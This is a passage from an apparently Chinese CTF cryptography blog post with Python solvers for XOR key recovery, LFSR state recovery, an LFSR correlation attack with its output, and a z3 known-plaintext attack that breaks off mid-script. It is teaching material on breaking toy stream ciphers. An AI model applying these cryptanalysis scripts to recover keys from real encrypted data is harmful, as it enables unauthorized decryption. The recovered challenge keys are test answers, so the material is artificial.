class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">        possible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            _ = cipher_fragment[i] ^ cipher_fragment[j]</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">in</span> letters <span class="keyword">or</span> _ == <span class="number">0</span>:</span><br><span class="line">                possible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> possible &gt; max_possible:</span><br><span class="line">            max_possible = possible</span><br><span class="line">            pro_space = i</span><br><span class="line">    <span class="keyword">return</span> cipher_fragment[pro_space] ^ <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(cipher, average_distances)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> key_length, _ <span class="keyword">in</span> average_distances[:<span class="number">5</span>]:</span><br><span class="line">        key = []</span><br><span class="line">        cipher_fragments = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(key_length)]</span><br><span class="line">        <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(cipher):</span><br><span class="line">            cipher_fragments[i % key_length].append(byte)</span><br><span class="line">        <span class="keyword">for</span> cipher_fragment <span class="keyword">in</span> cipher_fragments:</span><br><span class="line">            key.append(crack_key_fragment(cipher_fragment))</span><br><span class="line">        print(bytes(key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    masked_cipher = <span class="string">b'input your masked_cipher here'</span></span><br><span class="line">    salt = <span class="string">b'input your salt here'</span></span><br><span class="line">    cipher = bytes_xor(masked_cipher, salt *</span><br><span class="line">                       (len(masked_cipher) // len(salt) + <span class="number">1</span>))</span><br><span class="line">    average_distances = get_key_length(cipher)</span><br><span class="line">    crack_key(cipher, average_distances)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="LFSR-Basis"><a href="#LFSR-Basis" class="headerlink" title="LFSR - Basis"></a>LFSR - Basis</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>单个lfsr且已知抽头序列的情况下，只要有任意n个比特的流信息，即可轻易恢复完整流</p><p>等价于解n元1次方程（18年国赛streamgame）</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[26]</span></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">mask_bin = bin(mask)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)</span><br><span class="line">feedback = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> mask_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        feedback.append(i)</span><br><span class="line">feedback.append(<span class="number">32</span>)</span><br><span class="line">delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]</span></span><br><span class="line">cipher = open(<span class="string">"key"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]</span></span><br><span class="line">cipher_bin = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    cipher_bin += bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[30]</span></span><br><span class="line">cur = cipher_bin[:feedback[<span class="number">-1</span>] + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">    left = str(right.count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line">    flag = left + flag</span><br><span class="line">    cur = left + cur[:<span class="number">-1</span>]</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[36]</span></span><br><span class="line"><span class="string">'00110000011111010101001001100100'</span></span><br></pre></td></tr></table></figure><h3 id="LFSR-Correlation-Attack"><a href="#LFSR-Correlation-Attack" class="headerlink" title="LFSR - Correlation Attack"></a>LFSR - Correlation Attack</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p>实际使用的lfsr往往是多个lfsr并行，并通过代数运算F来获得密钥流</p><p><img src= "/img/loading.gif" data-src="/2020/03/12/Summary-of-Crypto-in-CTF-stream/Snipaste_2020-03-13_15-00-29.png" alt></p><p>列出代数运算F的真值表，即可得到相关系数$p_{1},…,p_{n}$</p><p>一般认为在$p_{i}\geq 0.6$时，能使用相关攻击对第i个lfsr的密钥流实现恢复($p_{i}=0.75$时效果较好)</p><p>相关攻击使得复杂度从$\prod$优化为$\sum$，余下相关系数趋于0.5的lfsr采用暴力枚举即可</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line">R1_mask, R2_mask, R3_mask = <span class="number">0x10020</span>, <span class="number">0x4100c</span>, <span class="number">0x100002</span></span><br><span class="line">R1_partMask, R2_partMask, R3_partMask = <span class="number">0xffffff</span>, <span class="number">0xffffff</span>, <span class="number">0xffffff</span></span><br><span class="line">n1, n2, n3 = <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span></span><br><span class="line">R = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">crack_state = [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>]  <span class="comment"># 相关攻击是否已完成(退出其他线程)</span></span><br><span class="line">start = time.clock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(read_length)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher</span><br><span class="line">    cipher_bytes = open(<span class="string">'cipher'</span>, <span class="string">'rb'</span>).read(read_length)</span><br><span class="line">    cipher = <span class="string">''</span>.join(bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> cipher_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R, mask, partMask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; partMask</span><br><span class="line">    i = (R &amp; mask) &amp; partMask</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_lfsr</span><span class="params">(R, mask, partMask, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R, out) = lfsr(R, mask, partMask)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1, R2, R3)</span>:</span></span><br><span class="line">    (R1_new, x1) = lfsr(R1, R1_mask, R1_partMask)</span><br><span class="line">    (R2_new, x2) = lfsr(R2, R2_mask, R2_partMask)</span><br><span class="line">    (R3_new, x3) = lfsr(R3, R3_mask, R3_partMask)</span><br><span class="line">    <span class="keyword">return</span> (R1_new, R2_new, R3_new, (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(R1, R2, R3, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R1, R2, R3, out) = single_round(R1, R2, R3)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">correlation</span><span class="params">(single_cipher, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(single_cipher) == len(cipher))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(single_cipher, cipher):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count / len(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_p</span><span class="params">()</span>:</span></span><br><span class="line">    p1, p2, p3 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                value = (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3)</span><br><span class="line">                p1 += x1 ^ value ^ <span class="number">1</span></span><br><span class="line">                p2 += x2 ^ value ^ <span class="number">1</span></span><br><span class="line">                p3 += x3 ^ value ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (p1 / <span class="number">8</span>, p2 / <span class="number">8</span>, p3 / <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask, low, high, index)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[index - <span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        single_cipher = single_lfsr(guess_R, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print((hex(guess_R)[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), correlation_value))</span><br><span class="line">            R[index - <span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[index - <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        guess_cipher = encrypt(R[<span class="number">0</span>], guess_R, R[<span class="number">2</span>], len(cipher))</span><br><span class="line">        <span class="keyword">if</span> guess_cipher == cipher:</span><br><span class="line">            R[<span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    init_stream(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># crack_p (step 1)</span></span><br><span class="line">    (p1, p2, p3) = crack_p()</span><br><span class="line">    print((p1, p2, p3))</span><br><span class="line">    <span class="comment"># correlation attack (step 2)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n1 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p1, R1_mask, R1_partMask, low, high, <span class="number">1</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    low = <span class="number">2</span>**(n3 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p3, R3_mask, R3_partMask, low, high, <span class="number">3</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="comment"># brute_force (step 3)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n2 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=brute_force, args=(low, high))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(hex(R[<span class="number">0</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">1</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">2</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(0.75, 0.5, 0.75)</span><br><span class="line">('01b9cb', 0.74755859375)</span><br><span class="line">cost 30.8923027s</span><br><span class="line">('16b2f3', 0.74169921875)</span><br><span class="line">cost 362.5205596s</span><br><span class="line">cost 436.23293620000004s</span><br><span class="line">01b9cb05979c16b2f3</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>exp对应的是强网杯streamgame3，在pypy3下大约七八分钟能出答案，但python3估计就有点儿慢了-.-</p><p>网上现在传的版本大多也都只是相关攻击，顶多在多线程上进行部分优化</p><p>快速相关攻击的A算法原理理解很容易，但我编写脚本测试后发现出不来…暂时搁置</p><p>安全客上有一篇讲LFSR相关攻击的文章，分别用了开普敦大学的轮子和z3约束来进行求解，链接如下</p><p><a href="https://www.anquanke.com/post/id/184828" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184828</a></p><h3 id="LFSR-Known-Plain-Attack"><a href="#LFSR-Known-Plain-Attack" class="headerlink" title="LFSR - Known Plain Attack"></a>LFSR - Known Plain Attack</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p>LFSR的KPA问题（已知明文长度要大等于两倍的LFSR级数n）</p><ul><li>对LFSR级数n进行range(2, len(stream) // 2)上的爆破（stream是已知明文段）</li><li>因为$len(stream)//2\geq n$，所以每个猜测级数i下均对应至少i个i元线性方程（系数矩阵秩&lt;i情况一般不考虑）</li><li>LFSR的下一位只受当前n位和抽头序列影响，因此得到n个GF(2)上形如$\sum_{i=1}^{n}p_{i}$, if stream[i]==1的线性方程，于是抽头序列$\\{p_{i}\\}$获知，恢复全部明文并校验即可</li></ul><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47 = BitVecs(</span><br><span class="line">    <span class="string">'p0 p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 p17 p18 p19 p20 p21 p22 p23 p24 p25 p26 p27 p28 p29 p30 p31 p32 p33 p34 p35 p36 p37 p38 p39 p40 p41 p42 p43 p44 p45 p46 p47'</span>, <span class="number">1</span>)</span><br><span class="line">p = [p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24,</span><br><span class="line">     p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(known_plain, known_cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known_plain) == len(known_cipher) <span class="keyword">and</span> len(known_plain) &lt;= <span class="number">24</span>)</span><br><span class="line">    known_plain_dec = int(known_plain, <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#known_plain_dec = int('89504E470D0A1A0A0000000D', 16)</span></span><br><span class="line">    known_cipher_dec = int(known_cipher, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> bin(known_plain_dec ^ known_cipher_dec)[<span class="number">2</span>:].rjust(<span class="number">4</span> * len(known_plain), <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(stream, key_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(stream) &gt;= <span class="number">2</span> * key_length)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment">#var_name = ['p' + str(i) for i in range(key_length)]</span></span><br><span class="line">    <span class="comment">#exec('&#123;&#125;=BitVecs(\'&#123;&#125;\',1)'.format(",".join(var_name), " ".join(var_name)))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(stream) - key_length):</span><br><span class="line">        cur = stream[i: i + key_length + <span class="number">1</span>]</span><br><span class="line">        equation = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_length):</span><br><span class="line">            <span class="keyword">if</span> cur[j] == <span class="string">'1'</span>:</span><br><span class="line">                equation += <span class="string">'p'</span> + str(j) + <span class="string">'+'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> len(equation):</span><br><span class="line">            equation = equation[:<span class="number">-1</span>] + <span class="string">' == '</span> + str(cur[<span class="number">-1</span>])</span><br><span class="line">            solver.add(eval(equation))</span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        feedback = <span class="string">''</span>.join([str(m[p[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> range(key_length)])</span><br><span class="line">        <span class="comment">#print('[&#123;&#125;]: ini_key = \'&#123;&#125;\' ; feedback = \'&#123;&#125;\''.format(str(key_length), stream[:key_length], feedback))</span></span><br><span class="line">        <span class="keyword">return</span> (stream[:key_length], feedback)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    cur_num = int(cur, <span class="number">2</span>)</span><br><span class="line">    output = (cur_num &lt;&lt; <span class="number">1</span>) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    i = (cur_num &amp; int(feedback, <span class="number">2</span>)) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    output = bin(output)[<span class="number">2</span>:].rjust(len(cur), <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_byte</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(cur) &gt;= <span class="number">8</span>:</span><br><span class="line">        byte = int(cur[:<span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            cur, lastbit = lfsr(cur, feedback)</span><br><span class="line">        <span class="keyword">return</span> (cur, byte)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte = cur</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span> - len(cur)):</span><br><span class="line">            cur, lastbit = lfsr(cur, 